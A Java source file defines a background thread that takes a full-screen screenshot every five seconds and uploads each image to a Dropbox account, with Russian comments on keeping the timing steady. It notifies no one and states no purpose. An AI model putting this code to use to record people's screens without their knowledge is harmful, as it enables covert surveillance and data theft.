import com.dropbox.core.DbxRequestConfig;
import com.dropbox.core.v2.DbxClientV2;
import javax.imageio.ImageIO;
import java.awt.*;
import java.awt.image.BufferedImage;
import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.InputStream;
import java.text.SimpleDateFormat;
import java.util.Date;

public class MyThread extends Thread{

    @Override
    public void run(){
        String accessToken = "Your_Token";
        DbxRequestConfig config = DbxRequestConfig.newBuilder("dropbox/java-tutorial").build();
        DbxClientV2 client = new DbxClientV2(config, accessToken);
        long delay = 5000;
        for(;;){
            long start = System.currentTimeMillis();
            try {
                sleep(delay);
                BufferedImage image = new Robot().createScreenCapture(new Rectangle(Toolkit.getDefaultToolkit().getScreenSize()));
                ByteArrayOutputStream os = new ByteArrayOutputStream();
                ImageIO.write(image, "png", os);
                String date = new SimpleDateFormat("yyyyMMdd_HHmmss").format(new Date());
                InputStream is = new ByteArrayInputStream(os.toByteArray());
                client.files().uploadBuilder("/" + date + ".png").uploadAndFinish(is);
            } catch (Exception e) {
                e.printStackTrace();
            }
            long timeConsumedMillis = System.currentTimeMillis() - start - delay;//вычисляем время скриншотирования и отправки
            if (5000 > timeConsumedMillis) {
                delay = 5000 - timeConsumedMillis;//стремимся к идеальной задержке в 5сек
            }
        }
    }
}
